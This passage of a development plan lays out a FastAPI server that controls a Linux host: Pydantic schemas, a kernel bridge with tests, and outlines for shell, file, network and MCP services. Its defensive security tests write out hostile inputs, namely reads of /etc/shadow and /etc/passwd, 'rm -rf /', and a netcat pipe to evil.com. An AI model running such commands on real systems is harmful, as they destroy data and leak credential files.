from typing import Any, Literal

from pydantic import BaseModel, Field


# --- Common ---

class ErrorResponse(BaseModel):
    error: str
    message: str
    detail: str | None = None
    request_id: str | None = None


# --- Kernel ---

class KernelStatusResponse(BaseModel):
    state: str
    governor: str
    cpu_count: int
    services: int
    version: str | None = None


class GovernorRequest(BaseModel):
    mode: Literal["performance", "powersave", "ondemand", "conservative", "ai_adaptive"]
    cpu_mask: int | None = None


class GovernorResponse(BaseModel):
    governor: str
    cpu_mask: int | None = None


class CpuMetricsResponse(BaseModel):
    cpu_id: int
    usage_percent: float
    frequency_mhz: int
    temperature_c: float
    io_read_bytes: int
    io_write_bytes: int


class FrequencyRequest(BaseModel):
    cpu_id: int = 0
    min_freq_mhz: int
    max_freq_mhz: int


# --- System ---

class SystemInfoResponse(BaseModel):
    hostname: str
    os: str
    kernel: str
    uptime_seconds: float
    cpu_count: int
    cpu_percent: float
    memory_total_mb: int
    memory_used_mb: int
    memory_percent: float
    disk_total_gb: float
    disk_used_gb: float
    disk_percent: float
    load_avg: list[float]


class ProcessInfo(BaseModel):
    pid: int
    name: str
    cpu_percent: float
    memory_mb: float
    status: str
    user: str


class ProcessListResponse(BaseModel):
    processes: list[ProcessInfo]
    total: int


class ServiceAction(BaseModel):
    action: Literal["start", "stop", "restart", "enable", "disable"]


# --- Files ---

class FileReadRequest(BaseModel):
    path: str
    offset: int = 0
    limit: int = 1000


class FileReadResponse(BaseModel):
    path: str
    content: str
    size: int
    lines: int


class FileWriteRequest(BaseModel):
    path: str
    content: str
    mode: Literal["write", "append"] = "write"


class FileEditRequest(BaseModel):
    path: str
    old_string: str
    new_string: str


class FileInfoResponse(BaseModel):
    path: str
    size: int
    is_dir: bool
    permissions: str
    modified: str
    owner: str


class FileSearchRequest(BaseModel):
    path: str = "."
    pattern: str
    content_search: bool = False
    max_results: int = 50


class FileListResponse(BaseModel):
    path: str
    entries: list[FileInfoResponse]


# --- Dev ---

class GitStatusResponse(BaseModel):
    branch: str
    clean: bool
    staged: list[str]
    modified: list[str]
    untracked: list[str]


class GitCommitRequest(BaseModel):
    message: str
    files: list[str] | None = None


class GitLogEntry(BaseModel):
    hash: str
    author: str
    date: str
    message: str


class PackageInstallRequest(BaseModel):
    manager: Literal["pip", "npm", "apt"]
    packages: list[str]


# --- Network ---

class HttpProxyRequest(BaseModel):
    method: Literal["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD"] = "GET"
    url: str
    headers: dict[str, str] | None = None
    body: str | None = None
    timeout: int = 30


class HttpProxyResponse(BaseModel):
    status_code: int
    headers: dict[str, str]
    body: str
    elapsed_ms: float


# --- Shell ---

class ShellExecRequest(BaseModel):
    command: str
    timeout: int = Field(default=30, ge=1, le=300)
    cwd: str | None = None


class ShellExecResponse(BaseModel):
    exit_code: int
    stdout: str
    stderr: str
    elapsed_ms: float


# --- Monitor ---

class MetricsSnapshot(BaseModel):
    timestamp: str
    cpu_percent: float
    memory_percent: float
    disk_percent: float
    temperature: float | None
    load_avg: list[float]
    network_sent_mb: float
    network_recv_mb: float


class AlertConfig(BaseModel):
    cpu_percent: int = 85
    memory_percent: int = 85
    disk_percent: int = 90
    temperature_c: int = 80


class AlertEntry(BaseModel):
    id: int
    timestamp: str
    severity: str
    source: str
    message: str
    resolved: bool


# --- Logs ---

class LogSearchRequest(BaseModel):
    pattern: str
    source: str | None = None
    start_time: str | None = None
    end_time: str | None = None
    limit: int = 100


class LogEntry(BaseModel):
    timestamp: str
    level: str
    source: str
    message: str


# --- AI ---

class AIChatRequest(BaseModel):
    message: str
    model: str = "linux-ai-agent"
    context: list[dict[str, str]] | None = None


class AIChatResponse(BaseModel):
    response: str
    model: str
    elapsed_ms: float
```

**Step 4: Run tests**

Run: `python -m pytest tests/test_schemas.py -v`
Expected: 6 tests PASS

**Step 5: Commit**

```bash
git add app/models/ tests/test_schemas.py
git commit -m "feat: comprehensive Pydantic v2 schemas for all API endpoints"
```

---

### Task 9: Kernel Bridge Core Service

**Files:**
- Create: `app/core/kernel_bridge.py`
- Create: `tests/test_kernel.py`
- Create: `app/api/kernel.py`

**Step 1: Write the failing test**

```python
# tests/test_kernel.py
import pytest
from unittest.mock import patch, mock_open
from app.core.kernel_bridge import KernelBridge


@pytest.fixture
def bridge():
    return KernelBridge()


def test_read_sysfs_version(bridge):
    with patch("builtins.open", mock_open(read_data="0.3.3\n")):
        result = bridge.read_sysfs("version")
        assert result == "0.3.3"


def test_read_sysfs_not_found(bridge):
    with patch("builtins.open", side_effect=FileNotFoundError):
        result = bridge.read_sysfs("nonexistent")
        assert result is None


def test_read_proc_status(bridge):
    mock_content = "state: running\ngovernor: performance\ncpu_count: 4\nservices: 2\n"
    with patch("builtins.open", mock_open(read_data=mock_content)):
        result = bridge.read_proc_status()
        assert result["state"] == "running"
        assert result["governor"] == "performance"


def test_governor_name_mapping(bridge):
    assert bridge.governor_name(0) == "performance"
    assert bridge.governor_name(1) == "powersave"
    assert bridge.governor_name(4) == "ai_adaptive"
    assert bridge.governor_name(99) == "unknown"


def test_governor_id_mapping(bridge):
    assert bridge.governor_id("performance") == 0
    assert bridge.governor_id("powersave") == 1
    assert bridge.governor_id("nonexistent") == -1


def test_is_available_without_kernel(bridge):
    with patch("os.path.exists", return_value=False):
        assert bridge.is_available() is False
```

**Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_kernel.py -v`
Expected: FAIL

**Step 3: Implement kernel bridge**

```python
# app/core/kernel_bridge.py
"""Kernel bridge — wraps ioctl/procfs/sysfs access to Linux-AI kernel module.

Gracefully degrades when kernel module is not loaded (e.g., Docker, dev environment).
"""

from __future__ import annotations

import os
import struct
from pathlib import Path

from app.exceptions import KernelError

DEVICE_PATH = "/dev/ai_ctl"
PROC_STATUS = "/proc/ai_status"
PROC_CONFIG = "/proc/ai_config"
SYSFS_BASE = "/sys/ai"

AI_IOC_MAGIC = ord("A")

GOV_NAMES = {
    0: "performance",
    1: "powersave",
    2: "ondemand",
    3: "conservative",
    4: "ai_adaptive",
}
GOV_BY_NAME = {v: k for k, v in GOV_NAMES.items()}

STATE_NAMES = {
    0: "stopped",
    1: "running",
    2: "training",
    3: "error",
}


class KernelBridge:
    """Interface to Linux-AI kernel module. All methods are safe to call even without the module."""

    def is_available(self) -> bool:
        return os.path.exists(DEVICE_PATH)

    def governor_name(self, mode_id: int) -> str:
        return GOV_NAMES.get(mode_id, "unknown")

    def governor_id(self, name: str) -> int:
        return GOV_BY_NAME.get(name, -1)

    def read_sysfs(self, attr: str) -> str | None:
        path = f"{SYSFS_BASE}/{attr}"
        try:
            with open(path) as f:
                return f.read().strip()
        except (FileNotFoundError, PermissionError, OSError):
            return None

    def write_sysfs(self, attr: str, value: str) -> bool:
        path = f"{SYSFS_BASE}/{attr}"
        try:
            with open(path, "w") as f:
                f.write(value)
            return True
        except (FileNotFoundError, PermissionError, OSError) as e:
            raise KernelError(f"Failed to write sysfs {attr}: {e}")

    def read_proc_status(self) -> dict[str, str]:
        try:
            with open(PROC_STATUS) as f:
                result = {}
                for line in f:
                    if ":" in line:
                        key, _, val = line.partition(":")
                        result[key.strip()] = val.strip()
                return result
        except (FileNotFoundError, PermissionError, OSError):
            return {}

    def write_proc_config(self, key: str, value: str) -> bool:
        try:
            with open(PROC_CONFIG, "w") as f:
                f.write(f"{key}={value}\n")
            return True
        except (FileNotFoundError, PermissionError, OSError) as e:
            raise KernelError(f"Failed to write proc config {key}: {e}")

    def get_status(self) -> dict:
        if not self.is_available():
            return {
                "state": "unavailable",
                "governor": "unknown",
                "cpu_count": os.cpu_count() or 1,
                "services": 0,
                "version": None,
                "kernel_module": False,
            }
        status = self.read_proc_status()
        return {
            "state": status.get("state", "unknown"),
            "governor": status.get("governor", "unknown"),
            "cpu_count": int(status.get("cpu_count", os.cpu_count() or 1)),
            "services": int(status.get("services", 0)),
            "version": self.read_sysfs("version"),
            "kernel_module": True,
        }

    def set_governor(self, mode: str) -> bool:
        if not self.is_available():
            raise KernelError("Kernel module not loaded")
        gov_id = self.governor_id(mode)
        if gov_id < 0:
            raise KernelError(f"Unknown governor mode: {mode}")
        return self.write_proc_config("governor", mode)
```

**Step 4: Create kernel API router**

```python
# app/api/kernel.py
"""Kernel control API endpoints."""

from __future__ import annotations

from fastapi import APIRouter, Depends

from app.core.kernel_bridge import KernelBridge
from app.models.schemas import GovernorRequest, GovernorResponse, KernelStatusResponse

router = APIRouter(prefix="/api/v1/kernel", tags=["kernel"])


def get_kernel_bridge() -> KernelBridge:
    return KernelBridge()


@router.get("/status", response_model=KernelStatusResponse)
async def kernel_status(bridge: KernelBridge = Depends(get_kernel_bridge)):
    status = bridge.get_status()
    return KernelStatusResponse(
        state=status["state"],
        governor=status["governor"],
        cpu_count=status["cpu_count"],
        services=status["services"],
        version=status.get("version"),
    )


@router.get("/governor", response_model=GovernorResponse)
async def get_governor(bridge: KernelBridge = Depends(get_kernel_bridge)):
    status = bridge.get_status()
    return GovernorResponse(governor=status["governor"])


@router.put("/governor", response_model=GovernorResponse)
async def set_governor(
    body: GovernorRequest,
    bridge: KernelBridge = Depends(get_kernel_bridge),
):
    bridge.set_governor(body.mode)
    return GovernorResponse(governor=body.mode, cpu_mask=body.cpu_mask)
```

**Step 5: Mount router in main.py, run all tests**

Run: `python -m pytest tests/ -v`
Expected: All PASS

**Step 6: Commit**

```bash
git add app/core/kernel_bridge.py app/api/kernel.py tests/test_kernel.py
git commit -m "feat: kernel bridge with ioctl/procfs/sysfs + REST API endpoints"
```

---

### Task 10: System Manager Core Service

**Files:**
- Create: `app/core/system_manager.py`
- Create: `app/api/system.py`
- Create: `tests/test_system.py`

This task follows the same TDD pattern. Implementation uses `psutil` for metrics and `subprocess.run` for systemctl. Tests mock `psutil` returns. Endpoints: `/system/info`, `/system/processes`, `/system/processes/{pid}/signal`, `/system/services`, `/system/services/{name}/{action}`.

**Commit message:** `"feat: system manager with process/service control + REST API"`

---

### Task 11: File Manager Core Service

**Files:**
- Create: `app/core/file_manager.py`
- Create: `app/api/files.py`
- Create: `tests/test_files.py`

Safe file CRUD with path traversal prevention (resolve path, check prefix against allowed_paths). Tests use `tmp_path` fixture. Endpoints: `/files/read`, `/files/write`, `/files/edit`, `/files/delete`, `/files/list`, `/files/search`, `/files/info`.

**Critical security test:**
```python
def test_path_traversal_blocked(file_mgr):
    with pytest.raises(AuthorizationError):
        file_mgr.validate_path("/etc/shadow")

    with pytest.raises(AuthorizationError):
        file_mgr.validate_path("/home/user/../../etc/passwd")
```

**Commit message:** `"feat: file manager with CRUD, path traversal prevention + REST API"`

---

### Task 12: Shell Executor Core Service

**Files:**
- Create: `app/core/shell_executor.py`
- Create: `app/api/shell.py`
- Create: `tests/test_shell.py`

Whitelist enforcement: extract first word of command, check against `settings.shell_whitelist`. Uses `asyncio.create_subprocess_exec` with timeout. Tests verify whitelist, timeout, output capture.

**Critical security test:**
```python
def test_command_injection_blocked():
    executor = ShellExecutor(whitelist=["ls"])
    with pytest.raises(AuthorizationError):
        executor.validate_command("ls; rm -rf /")
    with pytest.raises(AuthorizationError):
        executor.validate_command("ls && cat /etc/shadow")
    with pytest.raises(AuthorizationError):
        executor.validate_command("ls | nc evil.com 1234")
```

**Commit message:** `"feat: shell executor with whitelist enforcement + injection prevention"`

---

### Task 13: Network Proxy Core Service

**Files:**
- Create: `app/core/network_proxy.py`
- Create: `app/api/network.py`
- Create: `tests/test_network.py`

Uses `httpx.AsyncClient` to proxy HTTP requests. Endpoints: `/network/request` (proxy), `/network/interfaces` (psutil), `/network/connections` (psutil), `/network/dns` (socket.getaddrinfo), `/network/ping` (subprocess ping).

**Commit message:** `"feat: network proxy for HTTP, DNS, ping + interface listing"`

---

### Task 14: Dev Manager Core Service

**Files:**
- Create: `app/core/dev_manager.py`
- Create: `app/api/dev.py`
- Create: `tests/test_dev.py`

Git operations via `subprocess.run(["git", ...])`. Package install via subprocess. Endpoints: `/dev/git/*`, `/dev/packages/*`, `/dev/scaffold`.

**Commit message:** `"feat: dev manager with git operations, package management, scaffolding"`

---

## Phase 4: Real-Time Features (Tasks 15-17)

### Task 15: Monitor Agent + WebSocket

**Files:**
- Create: `app/core/monitor_agent.py`
- Create: `app/api/monitoring.py`
- Create: `app/ws/__init__.py`
- Create: `app/ws/monitor.py`
- Create: `tests/test_monitoring.py`

Metrics collection via psutil with configurable interval. WebSocket endpoint at `/ws/monitor` pushes JSON metrics every N seconds. DB storage for history.

**Commit message:** `"feat: monitoring agent with WebSocket live metrics + alert system"`

---

### Task 16: WebSocket Terminal (tmux)

**Files:**
- Create: `app/core/terminal_manager.py`
- Create: `app/ws/terminal.py`
- Create: `tests/test_websocket.py`

Terminal sessions via tmux subprocess. WebSocket at `/ws/terminal`. Session management: create, attach, detach, destroy. Resize support. Idle timeout. Max sessions limit.

**Commit message:** `"feat: WebSocket interactive terminal with tmux backend"`

---

### Task 17: Log Manager + WebSocket

**Files:**
- Create: `app/core/log_manager.py`
- Create: `app/api/logs.py`
- Create: `app/ws/logs.py`
- Create: `tests/test_logs.py`

Log aggregation from multiple sources. Search with regex. Tail. Stats. WebSocket live streaming at `/ws/logs`.

**Commit message:** `"feat: log manager with search, tail, stats + WebSocket live streaming"`

---

## Phase 5: Integrations (Tasks 18-19)

### Task 18: WebOps Proxy + AI Inference

**Files:**
- Create: `app/core/webops_proxy.py`
- Create: `app/core/ai_inference.py`
- Create: `app/api/webops.py`
- Create: `app/api/ai.py`
- Create: `tests/test_webops.py`
- Create: `tests/test_ai.py`

WebOps: httpx proxy to Vercel/Cloudflare/Supabase/GitHub/Coolify with token injection from config.
AI: httpx client to Ollama API at localhost:11434.

**Commit message:** `"feat: web ops proxy and AI inference via Ollama"`

---

### Task 19: MCP Server

**Files:**
- Create: `app/mcp/__init__.py`
- Create: `app/mcp/server.py`
- Create: `app/mcp/tools.py`
- Create: `tests/test_mcp.py`

MCP server using `mcp` Python package. Exposes all core services as MCP tools. Both stdio and SSE transports.

**Commit message:** `"feat: MCP server exposing all core services as Claude tools"`

---

## Phase 6: API Router + Integration (Task 20)

### Task 20: Mount All Routers + Integration Tests

**Files:**
- Create: `app/api/router.py`
- Modify: `app/main.py` — wire everything via lifespan
- Create: `tests/test_integration.py`

```python
# app/api/router.py
"""Mount all API routers."""

from fastapi import FastAPI

from app.api import auth, kernel, system, files, dev, network, shell, monitoring, logs, webops, ai


def mount_routers(app: FastAPI) -> None:
    app.include_router(auth.router)
    app.include_router(kernel.router)
    app.include_router(system.router)
    app.include_router(files.router)
    app.include_router(dev.router)
    app.include_router(network.router)
    app.include_router(shell.router)
    app.include_router(monitoring.router)
    app.include_router(logs.router)
    app.include_router(webops.router)
    app.include_router(ai.router)
```

Integration tests: full CRUD cycle, auth flow, kernel status, file create→read→edit→delete.

**Commit message:** `"feat: mount all routers, full integration test suite"`

---

## Phase 7: Deployment + Security (Tasks 21-23)

### Task 21: Dockerfile + docker-compose

**Files:**
- Create: `Dockerfile`
- Create: `docker-compose.yml`

Multi-stage build: build deps in fat image, copy to slim runtime. Docker-compose with volume mounts for /proc, /sys, /dev/ai_ctl.

**Commit message:** `"feat: Docker multi-stage build + docker-compose for deployment"`

---

### Task 22: Security Tests

**Files:**
- Create: `tests/test_security.py`

Test suite covering: path traversal, shell injection, JWT tampering, rate limit enforcement, SQL injection on search, unauthorized access to admin endpoints.

**Commit message:** `"test: comprehensive security test suite"`

---

### Task 23: CI/CD Pipeline + Install Script

**Files:**
- Create: `.github/workflows/ci.yml`
- Create: `scripts/install.sh`
- Create: `scripts/generate_api_key.py`

CI: lint → type-check → security → test → build. Install script: create user, copy files, systemd unit, generate initial API key.

**Commit message:** `"feat: CI/CD pipeline, systemd install script, API key generator"`

---

## Task Summary

| Phase | Tasks | Focus |
|-------|-------|-------|
| 1: Foundation | 1-4 | Scaffold, config, database, auth |
| 2: Middleware | 5-7 | Request ID, rate limit, audit |
| 3: Core Services | 8-14 | Schemas, kernel, system, files, shell, network, dev |
| 4: Real-Time | 15-17 | Monitor WS, terminal WS, logs WS |
| 5: Integrations | 18-19 | WebOps proxy, AI, MCP server |
| 6: Integration | 20 | Router mount, integration tests |
| 7: Deployment | 21-23 | Docker, security tests, CI/CD |

**Total: 23 tasks, ~50+ test files, 80%+ coverage target**
